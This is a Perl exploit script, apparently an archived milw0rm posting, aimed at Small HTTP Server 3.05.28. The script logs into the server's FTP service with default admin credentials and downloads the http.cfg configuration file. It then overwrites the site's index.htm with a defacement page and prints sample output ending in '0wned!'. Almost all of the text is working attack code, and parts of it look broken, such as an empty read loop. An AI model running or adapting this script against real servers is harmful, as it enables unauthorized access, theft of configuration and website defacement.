<html><head><title>Small HTTP Server <= 3.05.28 Arbitrary Data Execution Exploit</title></head><pre>#!/usr/bin/perl
#
#  sHTTP FTPServer Abritary Data Execution Exploit
# --------------------------------------------------
#      Infam0us Gr0up - Securiti Research
# 
#
# E:\PERL&gt;perl shttp.pl localhost C:\shttps
# 
# [?] Version: libwww-perl-5.76
# [+] Connect to localhost...
# [+] Connected
# [+] Send user and pass..
# [+] Logged in!
# [+] Directory List:
# 
# . | 0
# .. | 0
# uninst.exe | 3072
# http.exe | 78848
# desc.htm | 42788
# license.txt | 1804
# http.cfg | 1616
# www | 0
# 1.txt | 41
# 
# [+] Getting FTP config..[OK]
# [+] Backup target file..[OK]
# [+] Set homepage defacement..[DONE]
# [*] 0wned!
# 
# Tested on Windows2000 SP4 (Win NT)
# info: infamous.2hell.com
#

use LWP;

$subject = &quot;sHTTP FTPServer Abritary Data Execution Exploit&quot;;
$vers = &quot;Small HTTP server  3.05.28&quot;;
$vendor = &quot;http://srv.mf.inc.ru&quot;;
$codz = &quot;basher13 - basher13(at)linuxmail.org&quot;;

if(@ARGV!=2){
    print &quot;\n&quot;;
    print &quot; $subject\n&quot;;
    print &quot;-------------------------------------------------\n\n&quot;;
    print &quot;Usage: $0 [remote IP] [dir_path] \n&quot;;
    print &quot;Exam: $0 127.0.0.1 c:\\shttps \n\n&quot;;
    exit;
}

use Net::FTP;
use IO::Dir;  
use Tk;

$target = $ARGV[0];
$path = $ARGV[1];


# Modify $text to changes the default homepage
$text = &quot;[title]PENETRATION TEST[/title]Subject: $subject[br]Version: $vers[br]URL: $vendor[br]Coders: $codz&quot;;

my $user = &quot;admin&quot;; # Changes USER to own feed
my $pass = &quot;ftp&quot;; # Changes PASS to own feed

$cols=1000000;

print &quot;\n&quot;;
print &quot;-------------------------------------------------------\n&quot;;
print &quot;[?] Version: libwww-perl-$LWP::VERSION\n&quot;;
sleep(2);
print &quot;[+] Connect to $target...\n&quot;; 
$ftp = Net::FTP-&gt;new($target, Debug =&gt; 0, Port =&gt; 21) || die &quot;could not 
connect: $!&quot;;

print &quot;[+] Connected\n&quot;;
print &quot;[+] Send user and pass..\n&quot;;
$ftp-&gt;login($user, $pass) || die &quot;could not login: $!&quot;; 
sleep(1);

print &quot;[+] Logged in!\n&quot;;
print &quot;[+] Directory List: \n\n&quot;;
sleep(2);

tie %dir, IO::Dir, $path;
foreach (keys %dir) {
print  $_, &quot; | &quot; , $dir{$_}-&gt;size,&quot;\n&quot;;
}

print &quot;\n&quot;;
print &quot;[+] Getting FTP config..&quot;;
sleep(1);

$ftp-&gt;get(&quot;http.cfg&quot;)
      or die &quot;Get failed &quot;, $ftp-&gt;message;  

print &quot;[OK]\n&quot;;
print &quot;[+] Backup target file..&quot;;
sleep(2);

$dirpath = &quot;$path\\www\\index.htm&quot;;

$lama = $dirpath;
$baru = &quot;$dirpath.BAK.$$(basher13)&quot;;

 open(OLD, &quot;&lt; $lama&quot;)         or die &quot;FAILED to open $lama\n[-] Reason: Try on another place..\n&quot;;
 open(NEW, &quot;&gt; $baru&quot;)         or die &quot;can't open $baru: $!\n&quot;;

 while () {
        s/\b(p)earl\b/${1}erl/i;
        (print NEW $_)       or die &quot;FAILED to write to $baru\n[-] Reason: Server has secure permission\n&quot;;
    }
 close(OLD)                  or die &quot;FAILED to close $lama\n&quot;;
 close(NEW)                  or die &quot;can't close $baru\n&quot;;

print &quot;[OK]\n&quot;;
print &quot;[+] Set homepage defacement..&quot;;
sleep(2);

open(OUT, &quot;&gt;$dirpath&quot;) or die(&quot;unable to open $dirpath: $!&quot;);
open FH, &quot;&gt;$dirpath&quot;;
print FH &quot;$text&quot;;
print &quot;[DONE]\n&quot;;
close FH;
    
print &quot;[*] 0wned!\n&quot;;
$ftp-&gt;quit;  
print &quot;-------------------------------------------------------\n&quot;;
my $mw = MainWindow-&gt;new(-title =&gt; 'INFO',);
    my $var;

    my $opt = $mw-&gt;Optionmenu(
                
                -options =&gt; [qw()],
                -command =&gt; sub { print &quot;\n[&gt;]: &quot;, shift, &quot;\n&quot; },
                -variable =&gt; \$var,
                )-&gt;pack;
    $opt-&gt;addOptions([- Subject=&gt;$subject],[- Version=&gt;$vers],[- Vendor=&gt;$vendor],[- Coder=&gt;$codz]);   
    $mw-&gt;Button(-text=&gt;'CLOSE', -command=&gt;sub{$mw-&gt;destroy})-&gt;pack;
    MainLoop;

# milw0rm.com [2005-07-15]</pre></html>